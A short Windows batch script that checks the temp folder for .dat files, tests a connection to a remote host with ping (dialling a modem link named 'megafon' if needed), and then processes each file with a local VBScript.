@echo off
for %%x in (%temp%\*b.dat) do if exist %%x goto e1
exit /B 0
:e1
ping -n 1 smgr.alwaysdata.net
if errorlevel 1 (rasdial megafon) else goto ok
if errorlevel 1 goto end
ping -n 1 smgr.alwaysdata.net
if errorlevel 1 goto end
:ok
for %%a in (%temp%\*b.dat) do cscript cvt.vbs %%a
:end
